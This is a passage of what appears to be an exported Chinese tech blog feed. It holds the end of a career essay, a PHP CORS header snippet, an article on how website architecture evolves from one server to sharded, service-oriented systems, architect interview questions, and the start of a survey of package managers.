<li>新的UX设计团队面临比以前更复杂的外部关系</li>
<li>如何帮助下属专业晋升</li>
</ol>
<p>　　但我也有我的优势：</p>
<ol>
<li>能轻松地理解版本管理、多平台特性、开发挑战等“工程”难题，然后管理好风险</li>
<li>参加了三年多设计部的管理会，对设计的“味道”有感觉。或者说品味远远高出实现能力</li>
<li>在UI方案上，我有用户同理心，不只是从“好看”来评判设计</li>
<li>我的演讲呈现能力和写作能力可以提升团队</li>
</ol>
<p>　　<strong>唔，也不全是坏消息嘛。那就开始做吧！</strong></p>
<p>　　前半年仍然是勉力支撑（哭），但因为团队都在看着自己，不自信也要自信起来。</p>
<p>　　工作之余多体验各种APP，收集UI、运营、营收、品牌等方面的案例，进一步提升“产品力”。老婆平时在使用新的APP，或者被活动吸引付费时，我就会在边上观察她的行为。看到精彩处，我还会请求暂停，截图发给我。</p>
<p>　　总之，我希望自己的专业成长能快速补上权限扩大带来的差距。</p>
<p>　　慢慢地，有一些“腾讯微云用户体验不错”的口碑了，在自己能影响的范围内，使用我能调用的资源，慢慢地补齐漏洞，提升体验。</p>
<p>　　但仍然能力有限，有时候会出现仓促出的方案不合理的情况。这时更加如履薄冰，不是怕外部批评我，而是怕连累授权给我的上司，和被我能力所限的团队。加上腾讯微云也是一个有历史包袱的产品，所以仍然离自己心中的理想产品差很多。</p>
<p>　　团队成长上的挑战同样很大。</p>
<p>　　我仔细观察每一个人的优缺点，用人所长。于此同时我还要横向去看部门其他设计师的输出，不希望相对独立的产品导致了封闭的专业氛围。这将是接下来花半年到一年重点要解决的。</p>
<p>　　我对现在这个挑战，还远远没到驾轻就熟的状态，可能还需要两年以上时间来消化，所以有时工作会觉得比前几年加起来还累。</p>
<p>　　我时常以山本耀司的话给自己打鸡血：</p>
<blockquote>
<p>我从不相信什么懒洋洋的自由，我向往的自由是通过勤奋和努力实现更广阔的人生，那样的自由才是珍贵的、有价值的。我相信一万小时定律，我从来不相信天上掉馅饼的灵感和坐等的成就。做一个自由又自律的人，靠势必实现的决心认真地活着。</p>
</blockquote>
<p>　　勤奋和努力只是基础，以大多数人的努力程度之低，还根本谈不上拼天赋。</p>
<p>　　疲劳和兴奋交替，成就和挫折并存，曲折前行，比轻松混日子更有趣。</p>
<h2 id="五、"><a href="#五、" class="headerlink" title="五、"></a>五、</h2><p>　　回头看，这八年来，我从来都只是“<strong>短暂地胜任</strong>”自己的工作。每当我觉得能够驾轻就熟地处理目前的日常，就会迎来新的挑战。</p>
<p>　　想到这一点，我突然悟到一种“佛性”的工作哲学：</p>
<blockquote>
<p>每当你能胜任当前的工作，就会迎来更高难度的挑战。</p>
</blockquote>
<p>　　每一个能胜任当前工作岗位的人，都会被提拔。继续胜任，那就继续提拔，直到不能胜任。</p>
<p>　　因此，不用特别在意自己的头衔、权限和职级，外部的认可是你能力的反馈。你没有被提拔，大概率是因为还不胜任当前工作。如果完全胜任还没有被安排更有挑战的工作，要么自己找事情做，要么跳槽转岗。</p>
<p>　　反过来说，自知自己能力还达不到岗位要求也不用担心，不胜任是常态，以胜任为目标就好啦。</p>
<p>　　对于职场马拉松来说，心态放松，保持作息，持续养成好的习惯，学习好的方法和观念，这才是最重要的。</p>
<p>　　作者简介：</p>
<p>　　余果</p>
<p>　　腾讯微云设计负责人，《Web全栈工程师的自我修养》作者。</p>
]]></content>
      <categories>
        <category>Career</category>
      </categories>
  </entry>
  <entry>
    <title>PHP 开启 CORS</title>
    <url>/2018/08/php-core/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>本篇文章用代码解决了 php 和 js 在网站开发中遇到的跨域问题。</p>
<h2 id="php-后台响应头部代码"><a href="#php-后台响应头部代码" class="headerlink" title="php 后台响应头部代码"></a>php 后台响应头部代码</h2><span id="more"></span>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//json头</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line"><span class="comment">//跨域</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Access-Control-Allow-Credentials: true&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Access-Control-Allow-Origin: 跨域URL&quot;</span>);</span><br><span class="line"><span class="comment">//CORS</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Access-Control-Request-Methods:GET, POST, PUT, DELETE, OPTIONS&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Access-Control-Allow-Headers:x-requested-with,content-type,test-token,test-sessid&#x27;</span>);<span class="comment">//注意头部自定义参数不要用下划线</span></span><br></pre></td></tr></table></figure>

<h2 id="js-请求代码"><a href="#js-请求代码" class="headerlink" title="js 请求代码"></a>js 请求代码</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="attr">xhrFields</span>: &#123;<span class="attr">withCredentials</span>: <span class="literal">true</span>&#125;,</span><br><span class="line">        <span class="attr">crossDomain</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">data</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="attr">beforeSend</span>: <span class="keyword">function</span> (<span class="params">XMLHttpRequest</span>) &#123;</span><br><span class="line">            <span class="title class_">XMLHttpRequest</span>.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;test-token&quot;</span>, <span class="string">&#x27;abcd&#x27;</span>);</span><br><span class="line">            <span class="title class_">XMLHttpRequest</span>.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;test-sessid&quot;</span>, <span class="string">&#x27;abcd&#x27;</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">error</span>: <span class="keyword">function</span> (<span class="params">XMLHttpRequest</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title class_">XMLHttpRequest</span>.<span class="property">status</span> === <span class="number">401</span>) &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;,</span><br><span class="line">        <span class="attr">complete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Php</category>
      </categories>
  </entry>
  <entry>
    <title>单机至亿级流量大型网站系统架构的演进过程</title>
    <url>/2018/08/server-website/</url>
    <content><![CDATA[<h1 id="阿里P9架构师讲解从单机至亿级流量大型网站系统架构的演进过程"><a href="#阿里P9架构师讲解从单机至亿级流量大型网站系统架构的演进过程" class="headerlink" title="阿里P9架构师讲解从单机至亿级流量大型网站系统架构的演进过程"></a>阿里P9架构师讲解从单机至亿级流量大型网站系统架构的演进过程</h1><h1 id="阶段一、单机构建网站"><a href="#阶段一、单机构建网站" class="headerlink" title="阶段一、单机构建网站"></a>阶段一、单机构建网站</h1><span id="more"></span>

<p>网站的初期，我们经常会在单机上跑我们所有的程序和软件。此时我们使用一个容器，如tomcat、jetty、jboos，然后直接使用JSP&#x2F;servlet技术，或者使用一些开源的框架如maven+spring+struct+hibernate、maven+spring+springmvc+mybatis；最后再选择一个数据库管理系统来存储数据，如mysql、sqlserver、oracle，然后通过JDBC进行数据库的连接和操作。</p>
<p>把以上的所有软件都装载同一台机器上，应用跑起来了，也算是一个小系统了。此时系统结果如下：</p>
<p><img src="/images/2018/6401.png"></p>
<h1 id="阶段二、应用服务器与数据库分离"><a href="#阶段二、应用服务器与数据库分离" class="headerlink" title="阶段二、应用服务器与数据库分离"></a>阶段二、应用服务器与数据库分离</h1><p>随着网站的上线，访问量逐步上升，服务器的负载慢慢提高，在服务器还没有超载的时候，我们应该就要做好准备，提升网站的负载能力。假如我们代码层面已难以优化，在不提高单台机器的性能的情况下，增加机器是一个不错的方式，不仅可以有效地提高系统的负载能力，而且性价比高。</p>
<p>增加的机器用来做什么呢？此时我们可以把数据库，web服务器拆分开来，这样不仅提高了单台机器的负载能力，也提高了容灾能力。</p>
<p>应用服务器与数据库分开后的架构如下图所示：</p>
<p><img src="/images/2018/6402.png"></p>
<h1 id="阶段三、应用服务器集群"><a href="#阶段三、应用服务器集群" class="headerlink" title="阶段三、应用服务器集群"></a>阶段三、应用服务器集群</h1><p>随着访问量继续增加，单台应用服务器已经无法满足需求了。在假设数据库服务器没有压力的情况下，我们可以把应用服务器从一台变成了两台甚至多台，把用户的请求分散到不同的服务器中，从而提高负载能力。多台应用服务器之间没有直接的交互，他们都是依赖数据库各自对外提供服务。著名的做故障切换的软件有keepalived，keepalived是一个类似于layer3、4、7交换机制的软件，他不是某个具体软件故障切换的专属品，而是可以适用于各种软件的一款产品。keepalived配合上ipvsadm又可以做负载均衡，可谓是神器。</p>
<p>我们以增加了一台应用服务器为例，增加后的系统结构图如下：</p>
<p><img src="/images/2018/6403.png"></p>
<p>系统演变到这里，将会出现下面四个问题：</p>
<p>用户的请求由谁来转发到到具体的应用服务器</p>
<p>有什么转发的算法</p>
<p>应用服务器如何返回用户的请求</p>
<p>用户如果每次访问到的服务器不一样，那么如何维护session的一致性</p>
<p>我们来看看解决问题的方案：</p>
<p>1、第一个问题即是负载均衡的问题，一般有5种解决方案：</p>
<p>1、http重定向。HTTP重定向就是应用层的请求转发。用户的请求其实已经到了HTTP重定向负载均衡服务器，服务器根据算法要求用户重定向，用户收到重定向请求后，再次请求真正的集群</p>
<p>优点：简单。</p>
<p>缺点：性能较差。</p>
<p>2、DNS域名解析负载均衡。DNS域名解析负载均衡就是在用户请求DNS服务器，获取域名对应的IP地址时，DNS服务器直接给出负载均衡后的服务器IP。</p>
<p>优点：交给DNS，不用我们去维护负载均衡服务器。</p>
<p>缺点：当一个应用服务器挂了，不能及时通知DNS，而且DNS负载均衡的控制权在域名服务商那里，网站无法做更多的改善和更强大的管理。</p>
<p>3、反向代理服务器。在用户的请求到达反向代理服务器时（已经到达网站机房），由反向代理服务器根据算法转发到具体的服务器。常用的apache，nginx都可以充当反向代理服务器。</p>
<p>优点：部署简单。</p>
<p>缺点：代理服务器可能成为性能的瓶颈，特别是一次上传大文件。</p>
<p>4、IP层负载均衡。在请求到达负载均衡器后，负载均衡器通过修改请求的目的IP地址，从而实现请求的转发，做到负载均衡。</p>
<p>优点：性能更好。</p>
<p>缺点：负载均衡器的宽带成为瓶颈。</p>
<p>5、数据链路层负载均衡。在请求到达负载均衡器后，负载均衡器通过修改请求的mac地址，从而做到负载均衡，与IP负载均衡不一样的是，当请求访问完服务器之后，直接返回客户。而无需再经过负载均衡器。</p>
<p>2、第二个问题即是集群调度算法问题，常见的调度算法有10种。</p>
<p>1、rr 轮询调度算法。顾名思义，轮询分发请求。</p>
<p>优点：实现简单</p>
<p>缺点：不考虑每台服务器的处理能力</p>
<p>2、wrr 加权调度算法。我们给每个服务器设置权值weight，负载均衡调度器根据权值调度服务器，服务器被调用的次数跟权值成正比。</p>
<p>优点：考虑了服务器处理能力的不同</p>
<p>3、sh 原地址散列：提取用户IP，根据散列函数得出一个key，再根据静态映射表，查处对应的value，即目标服务器IP。过目标机器超负荷，则返回空。</p>
<p>4、dh 目标地址散列：同上，只是现在提取的是目标地址的IP来做哈希。</p>
<p>优点：以上两种算法的都能实现同一个用户访问同一个服务器。</p>
<p>5、lc 最少连接。优先把请求转发给连接数少的服务器。</p>
<p>优点：使得集群中各个服务器的负载更加均匀。</p>
<p>6、wlc 加权最少连接。在lc的基础上，为每台服务器加上权值。算法为：（活动连接数*256+非活动连接数）÷权重 ，计算出来的值小的服务器优先被选择。</p>
<p>优点：可以根据服务器的能力分配请求。</p>
<p>7、sed 最短期望延迟。其实sed跟wlc类似，区别是不考虑非活动连接数。算法为：（活动连接数+1)*256÷权重，同样计算出来的值小的服务器优先被选择。</p>
<p>8、nq 永不排队。改进的sed算法。我们想一下什么情况下才能“永不排队”，那就是服务器的连接数为0的时候，那么假如有服务器连接数为0，均衡器直接把请求转发给它，无需经过sed的计算。</p>
<p>9、LBLC 基于局部性的最少连接。均衡器根据请求的目的IP地址，找出该IP地址最近被使用的服务器，把请求转发之，若该服务器超载，最采用最少连接数算法。</p>
<p>10、LBLCR 带复制的基于局部性的最少连接。均衡器根据请求的目的IP地址，找出该IP地址最近使用的“服务器组”，注意，并不是具体某个服务器，然后采用最少连接数从该组中挑出具体的某台服务器出来，把请求转发之。若该服务器超载，那么根据最少连接数算法，在集群的非本服务器组的服务器中，找出一台服务器出来，加入本服务器组，然后把请求转发之。</p>
<p>3、第三个问题是集群模式问题，一般3种解决方案：</p>
<p>1、NAT：负载均衡器接收用户的请求，转发给具体服务器，服务器处理完请求返回给均衡器，均衡器再重新返回给用户。</p>
<p>2、DR：负载均衡器接收用户的请求，转发给具体服务器，服务器出来玩请求后直接返回给用户。需要系统支持IP Tunneling协议，难以跨平台。</p>
<p>3、TUN：同上，但无需IP Tunneling协议，跨平台性好，大部分系统都可以支持。</p>
<p>4、第四个问题是session问题，一般有4种解决方案：</p>
<p>1、Session Sticky。session sticky就是把同一个用户在某一个会话中的请求，都分配到固定的某一台服务器中，这样我们就不需要解决跨服务器的session问题了，常见的算法有ip_hash法，即上面提到的两种散列算法。</p>
<p>优点：实现简单。</p>
<p>缺点：应用服务器重启则session消失。</p>
<p>2、Session Replication。session replication就是在集群中复制session，使得每个服务器都保存有全部用户的session数据。</p>
<p>优点：减轻负载均衡服务器的压力，不需要要实现ip_hasp算法来转发请求。</p>
<p>缺点：复制时宽带开销大，访问量大的话session占用内存大且浪费。</p>
<p>3、Session数据集中存储：session数据集中存储就是利用数据库来存储session数据，实现了session和应用服务器的解耦。</p>
<p>优点：相比session replication的方案，集群间对于宽带和内存的压力减少了很多。</p>
<p>缺点：需要维护存储session的数据库。</p>
<p>4、Cookie Base：cookie base就是把session存在cookie中，有浏览器来告诉应用服务器我的session是什么，同样实现了session和应用服务器的解耦。</p>
<p>优点：实现简单，基本免维护。</p>
<p>缺点：cookie长度限制，安全性低，宽带消耗。</p>
<p>值得一提的是：</p>
<p>nginx目前支持的负载均衡算法有wrr、sh（支持一致性哈希）、fair（本人觉得可以归结为lc）。但nginx作为均衡器的话，还可以一同作为静态资源服务器。</p>
<p>keepalived+ipvsadm比较强大，目前支持的算法有：rr、wrr、lc、wlc、lblc、sh、dh</p>
<p>keepalived支持集群模式有：NAT、DR、TUN</p>
<p>nginx本身并没有提供session同步的解决方案，而apache则提供了session共享的支持。</p>
<p>推荐一个Java高级技术进阶群：697579751，文章运用到的架构技术都会在群里分享，都能免费下载。有兴趣学习的猿猿可以加一下。</p>
<p>好了，解决了以上的问题之后，系统的结构如下：</p>
<p><img src="/images/2018/6404.png"></p>
<h1 id="阶段四、数据库读写分离化"><a href="#阶段四、数据库读写分离化" class="headerlink" title="阶段四、数据库读写分离化"></a>阶段四、数据库读写分离化</h1><p>上面我们总是假设数据库负载正常，但随着访问量的的提高，数据库的负载也在慢慢增大。那么可能有人马上就想到跟应用服务器一样，把数据库一份为二再负载均衡即可。但对于数据库来说，并没有那么简单。假如我们简单的把数据库一分为二，然后对于数据库的请求，分别负载到A机器和B机器，那么显而易见会造成两台数据库数据不统一的问题。那么对于这种情况，我们可以先考虑使用读写分离的方式。</p>
<p>读写分离后的数据库系统结构如下：</p>
<p><img src="/images/2018/6405.png"></p>
<p>这个结构变化后也会带来两个问题：</p>
<p>主从数据库之间数据同步问题</p>
<p>应用对于数据源的选择问题</p>
<p>解决问题方案：</p>
<p>我们可以使用MYSQL自带的master+slave的方式实现主从复制。</p>
<p>采用第三方数据库中间件，例如mycat。mycat是从cobar发展而来的，而cobar是阿里开源的数据库中间件，后来停止开发。mycat是国内比较好的mysql开源数据库分库分表中间件。</p>
<p>阶段五、用搜索引擎缓解读库的压力</p>
<p>数据库做读库的话，常常对模糊查找力不从心，即使做了读写分离，这个问题还未能解决。以我们所举的交易网站为例，发布的商品存储在数据库中，用户最常使用的功能就是查找商品，尤其是根据商品的标题来查找对应的商品。对于这种需求，一般我们都是通过like功能来实现的，但是这种方式的代价非常大。此时我们可以使用搜索引擎的倒排索引来完成。</p>
<p>搜索引擎具有以下优点：</p>
<p>它能够大大提高查询速度。</p>
<p>引入搜索引擎后也会带来以下的开销：</p>
<p>带来大量的维护工作，我们需要自己实现索引的构建过程，设计全量&#x2F;增加的构建方式来应对非实时与实时的查询需求。</p>
<p>需要维护搜索引擎集群</p>
<p>搜索引擎并不能替代数据库，他解决了某些场景下的“读”的问题，是否引入搜索引擎，需要综合考虑整个系统的需求。引入搜索引擎后的系统结构如下：</p>
<p><img src="/images/2018/6406.png"></p>
<h1 id="阶段六、用缓存缓解读库的压力"><a href="#阶段六、用缓存缓解读库的压力" class="headerlink" title="阶段六、用缓存缓解读库的压力"></a>阶段六、用缓存缓解读库的压力</h1><p>1、后台应用层和数据库层的缓存</p>
<p>随着访问量的增加，逐渐出现了许多用户访问同一部分内容的情况，对于这些比较热门的内容，没必要每次都从数据库读取。我们可以使用缓存技术，例如可以使用google的开源缓存技术guava或者使用memcacahe作为应用层的缓存，也可以使用redis作为数据库层的缓存。</p>
<p>另外，在某些场景下，关系型数据库并不是很适合，例如我想做一个“每日输入密码错误次数限制”的功能，思路大概是在用户登录时，如果登录错误，则记录下该用户的IP和错误次数，那么这个数据要放在哪里呢？假如放在内存中，那么显然会占用太大的内容；假如放在关系型数据库中，那么既要建立数据库表，还要简历对应的java bean，还要写SQL等等。而分析一下我们要存储的数据，无非就是类似{ip:errorNumber}这样的key:value数据。对于这种数据，我们可以用NOSQL数据库来代替传统的关系型数据库。</p>
<p>2、页面缓存</p>
<p>除了数据缓存，还有页面缓存。比如使用HTML5的localstroage或者cookie。</p>
<p>优点：</p>
<p>减轻数据库的压力</p>
<p>大幅度提高访问速度</p>
<p>缺点：</p>
<p>需要维护缓存服务器</p>
<p>提高了编码的复杂性</p>
<p>值得一提的是：</p>
<p>缓存集群的调度算法不同与上面提到的应用服务器和数据库。最好采用“一致性哈希算法”，这样才能提高命中率。这个就不展开讲了，有兴趣的可以查阅相关资料。</p>
<p>加入缓存后的结构：</p>
<p><img src="/images/2018/6407.png"></p>
<h1 id="阶段七、数据库水平拆分与垂直拆分"><a href="#阶段七、数据库水平拆分与垂直拆分" class="headerlink" title="阶段七、数据库水平拆分与垂直拆分"></a>阶段七、数据库水平拆分与垂直拆分</h1><p>我们的网站演进到现在，交易、商品、用户的数据都还在同一个数据库中。尽管采取了增加缓存，读写分离的方式，但随着数据库的压力继续增加，数据库的瓶颈越来越突出，此时，我们可以有数据垂直拆分和水平拆分两种选择。</p>
<p>推荐一个Java高级技术进阶群：697579751，文章运用到的架构技术都会在群里分享，都能免费下载。有兴趣学习的猿猿可以加一下。</p>
<p>7.1、数据垂直拆分</p>
<p>垂直拆分的意思是把数据库中不同的业务数据拆分道不同的数据库中，结合现在的例子，就是把交易、商品、用户的数据分开。</p>
<p>优点：</p>
<p>解决了原来把所有业务放在一个数据库中的压力问题。</p>
<p>可以根据业务的特点进行更多的优化</p>
<p>缺点：</p>
<p>需要维护多个数据库</p>
<p>问题：</p>
<p>需要考虑原来跨业务的事务</p>
<p>跨数据库的join</p>
<p>解决问题方案：</p>
<p>我们应该在应用层尽量避免跨数据库的事物，如果非要跨数据库，尽量在代码中控制。</p>
<p>我们可以通过第三方应用来解决，如上面提到的mycat，mycat提供了丰富的跨库join方案，详情可参考mycat官方文档。</p>
<p>垂直拆分后的结构如下：</p>
<p><img src="/images/2018/6408.png"></p>
<p>7.2、数据水平拆分</p>
<p>数据水平拆分就是把同一个表中的数据拆分到两个甚至多个数据库中。产生数据水平拆分的原因是某个业务的数据量或者更新量到达了单个数据库的瓶颈，这时就可以把这个表拆分到两个或更多个数据库中。</p>
<p>优点：</p>
<p>如果我们能客服以上问题，那么我们将能够很好地对数据量及写入量增长的情况。</p>
<p>问题：</p>
<p>访问用户信息的应用系统需要解决SQL路由的问题，因为现在用户信息分在了两个数据库中，需要在进行数据操作时了解需要操作的数据在哪里。</p>
<p>主键的处理也变得不同，例如原来自增字段，现在不能简单地继续使用了。</p>
<p>如果需要分页，就麻烦了。</p>
<p>解决问题方案：</p>
<p>我们还是可以通过可以解决第三方中间件，如mycat。mycat可以通过SQL解析模块对我们的SQL进行解析，再根据我们的配置，把请求转发到具体的某个数据库。</p>
<p>我们可以通过UUID保证唯一或自定义ID方案来解决。</p>
<p>mycat也提供了丰富的分页查询方案，比如先从每个数据库做分页查询，再合并数据做一次分页查询等等。</p>
<p>数据水平拆分后的结构：</p>
<p><img src="/images/2018/6409.png"></p>
<h1 id="阶段八、应用的拆分"><a href="#阶段八、应用的拆分" class="headerlink" title="阶段八、应用的拆分"></a>阶段八、应用的拆分</h1><p>8.1、拆分应用</p>
<p>随着业务的发展，业务越来越多，应用越来越大。我们需要考虑如何避免让应用越来越臃肿。这就需要把应用拆开，从一个应用变为俩个甚至更多。还是以我们上面的例子，我们可以把用户、商品、交易拆分开。变成“用户、商品”和“用户，交易”两个子系统。</p>
<p>拆分后的结构：</p>
<p><img src="/images/2018/6410.png"></p>
<p>问题：</p>
<p>这样拆分后，可能会有一些相同的代码，如用户相关的代码，商品和交易都需要用户信息，所以在两个系统中都保留差不多的操作用户信息的代码。如何保证这些代码可以复用是一个需要解决的问题。</p>
<p>解决问题：</p>
<p>通过走服务化的路线来解决</p>
<p>8.2、走服务化的道路</p>
<p>为了解决上面拆分应用后所出现的问题，我们把公共的服务拆分出来，形成一种服务化的模式，简称SOA。</p>
<p>采用服务化之后的系统结构：</p>
<p><img src="/images/2018/6411.png"></p>
<p>优点：</p>
<p>相同的代码不会散落在不同的应用中了，这些实现放在了各个服务中心，使代码得到更好的维护。</p>
<p>我们把对数据库的交互放在了各个服务中心，让”前端“的web应用更注重与浏览器交互的工作。</p>
<p>推荐一个Java高级技术进阶群：697579751，文章运用到的架构技术都会在群里分享，都能免费下载。有兴趣学习的猿猿可以加一下。</p>
<p>问题：</p>
<p>如何进行远程的服务调用</p>
<p>解决方法：</p>
<p>我们可以通过下面的引入消息中间件来解决</p>
<p>阶段九、引入消息中间件</p>
<p>随着网站的继续发展，我们的系统中可能出现不同语言开发的子模块和部署在不同平台的子系统。此时我们需要一个平台来传递可靠的，与平台和语言无关的数据，并且能够把负载均衡透明化，能在调用过程中收集调用数据并分析之，推测出网站的访问增长率等等一系列需求，对于网站应该如何成长做出预测。开源消息中间件有阿里的dubbo，可以搭配Google开源的分布式程序协调服务zookeeper实现服务器的注册与发现。</p>
<p>引入消息中间件后的结构：</p>
<p><img src="/images/2018/6412.png"></p>
<h1 id="十、总结"><a href="#十、总结" class="headerlink" title="十、总结"></a>十、总结</h1><p>以上的演变过程只是一个例子，并不适合所有的网站，实际中网站演进过程与自身业务和不同遇到的问题有密切的关系，没有固定的模式。只有认真的分析和不断地探究，才能发现适合自己网站的架构。</p>
]]></content>
      <categories>
        <category>Website</category>
      </categories>
  </entry>
  <entry>
    <title>软件架构师面试题</title>
    <url>/2018/08/software-interview/</url>
    <content><![CDATA[<h2 id="软件架构师"><a href="#软件架构师" class="headerlink" title="软件架构师"></a>软件架构师</h2><h3 id="插件的实现原理"><a href="#插件的实现原理" class="headerlink" title="插件的实现原理"></a>插件的实现原理</h3><ol>
<li>插件有几部分组成</li>
</ol>
<span id="more"></span>

<ol start="2">
<li><p>如何实现插件安装，卸载，启用，禁用？</p>
</li>
<li><p>安装，卸载，启用，禁用怎样实现不停机，不关闭服务的情况进行？</p>
</li>
</ol>
<h3 id="口述如何设计一个MVC框架"><a href="#口述如何设计一个MVC框架" class="headerlink" title="口述如何设计一个MVC框架"></a>口述如何设计一个MVC框架</h3><ol>
<li><p>怎样实现 URL 路由</p>
</li>
<li><p>怎样实现控制器</p>
</li>
<li><p>怎样实现视图</p>
</li>
<li><p>怎样实现模型</p>
</li>
</ol>
<h3 id="口述如何设计一个SOA框架"><a href="#口述如何设计一个SOA框架" class="headerlink" title="口述如何设计一个SOA框架"></a>口述如何设计一个SOA框架</h3><ol>
<li><p>框架分为几个部分？</p>
</li>
<li><p>采用什么协议与框架通信？</p>
</li>
<li><p>如果考虑到性能使用二进制协议你怎样实现？</p>
</li>
<li><p>如何解决并发冲突?</p>
</li>
<li><p>如何支持事务?</p>
</li>
<li><p>你怎样与消息队列集成或者通信？</p>
</li>
</ol>
<h3 id="口述设计一个分布式计划任务系统"><a href="#口述设计一个分布式计划任务系统" class="headerlink" title="口述设计一个分布式计划任务系统"></a>口述设计一个分布式计划任务系统</h3><p>背景：计划任务即周期或定时运行的程序，我们要解决单点故障问题与负载均衡的问题，在一个分布式系统中单节点是不允许的。</p>
<p>设计要求：能够实现高可用，负载均衡，横向扩展</p>
<ol>
<li><p>怎样处理同时运行产生的冲突问题？</p>
</li>
<li><p>怎样排队运行？</p>
</li>
<li><p>任务如何持久化？</p>
</li>
<li><p>一个节点宕机，另一个节点怎么接管没有完成的任务？</p>
</li>
<li><p>如何横向扩展？</p>
</li>
<li><p>扩展，收缩，维护如果能做到不停机，不影响业务？</p>
</li>
</ol>
]]></content>
      <categories>
        <category>Software</category>
      </categories>
  </entry>
  <entry>
    <title>各种语言常见的包管理工具</title>
    <url>/2018/08/software-package/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>包管理和构建系统是现代的软件开发团队中必不可少的工具，也是 Linux 软件系统的常见组织方式。</p>
<p>现代编程语言大多给出了自己专用的包管理和构建系统，那么本文便来总结一下小编用过的那些包管理和构建系统。</p>
<span id="more"></span>

<h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><p>服务器端 Javascript 通常使用<span class="exturl" data-url="aHR0cDovL25wbWpzLm9yZy8=">NPM<i class="fa fa-external-link-alt"></i></span>作为依赖管理工具。</p>
<ul>
<li>通过NPM提供的<code>npm</code>命令来进行依赖的下载、升级和移除。</li>
<li>通过<code>package.json</code>来定义软件包的元信息、开发依赖（开发或测试需要）、部署依赖（运行时需要）。</li>
<li>依赖递归地存储在<code>node_modules</code>中。</li>
<li>依赖在项目之间是隔离的，全局安装（<code>-g</code>）会使它成为命令行工具而不是全局依赖。 &gt; 递归的依赖下载风格使得NPM的缓存及其重要。缓存位于<code>~/.npm</code>下，这里保存这<code>.tgz</code>格式的包文件。</li>
</ul>
<p>JavaScript 通常使用 <span class="exturl" data-url="aHR0cDovL2dydW50anMuY29tLw==">Grunt<i class="fa fa-external-link-alt"></i></span> 进行构建。</p>
<ul>
<li>Grunt通过插件来完成任务，每个插件相当于Makefile的一个命令。</li>
<li>Grunt任务定义在<code>Gruntfile.js</code>中。</li>
<li>NPM提供了众多的Grunt插件，当然你也可以手写。</li>
<li>Grunt任务继承了JavaScript的异步特性。</li>
</ul>
<h1 id="前端-lib"><a href="#前端-lib" class="headerlink" title="前端 lib"></a>前端 lib</h1><p>前端 lib 可以通过 <span class="exturl" data-url="aHR0cDovL2Jvd2VyLmlvLw==">Bower<i class="fa fa-external-link-alt"></i></span> 来下载。Bower 不仅可以下载已注册的软件包，还可以下载Github Repo，甚至是一个文件的URL。</p>
<ul>
<li>通过<code>bower</code>命令进行依赖管理。</li>
<li><code>bower.json</code>定义了软件包的元信息与依赖。</li>
<li>依赖所在路径可以在<code>bower.json</code>中进行设置。</li>
<li>Bower只是一个命令行工具，你需要在正确的路径执行Bower命令。</li>
</ul>
<blockquote>
<p>Bower可以灵活地下载各种依赖，但它的缺点也是明显的：未注册的软件包往往包含冗余的非生产环境的代码，有时甚至需要手动构建。</p>
</blockquote>
<h1 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h1><p><span class="exturl" data-url="aHR0cHM6Ly9tYXZlbi5hcGFjaGUub3JnLw==">Maven<i class="fa fa-external-link-alt"></i></span>是基于项目对象模型(POM)的项目管理工具，通过文本文件来描述项目的版本、URL、License、依赖等信息。</p>
<ul>
<li>通过<code>pom.xml</code>来描述Maven项目。</li>
<li>Maven是项目管理工具，其功能包括依赖管理、软件构建。</li>
<li>Maven通过<code>.properties</code>文件和命令行参数读取系统特性。</li>
</ul>
<p><span class="exturl" data-url="aHR0cDovL2FudC5hcGFjaGUub3JnLw==">Ant<i class="fa fa-external-link-alt"></i></span>是由Java写成的编译、测试和部署Java应用的命令行工具。</p>
<ul>
<li>通过<code>build.xml</code>来描述构建过程。</li>
<li><code>build.xml</code>的逻辑类似Makefile，每个target由命令和参数构成。</li>
<li>通过命令行参数来读取系统特性。</li>
</ul>
<p><span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvR3JhZGxl">Gradle<i class="fa fa-external-link-alt"></i></span>是一个基于Apache Ant和Apache Maven概念的项目自动化建构工具。它使用一种基于Groovy的特定领域语言来声明项目设置，而不是传统的XML。</p>
<h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><p>Python的包管理工具能讲一整天的故事：distribute、setuptools、distutils、easy_install、pip、distutils2、packaging、eggs、wheels、pyvenv、virtualenv……</p>
<blockquote>
<p>这也是我为什么讨厌安装python软件的原因，与此同时，旧版本的python2比新的python3更加流行以及两者不兼容也常常给Linux包管理造成麻烦。</p>
</blockquote>
<p>现在开始讲故事：</p>
<ol>
<li>distutils是python的标准库；</li>
<li>setuptools试图完成distutils缺少的特性而开始开发；</li>
<li>easy_install是setuptools的命令行接口，有更多的特性;</li>
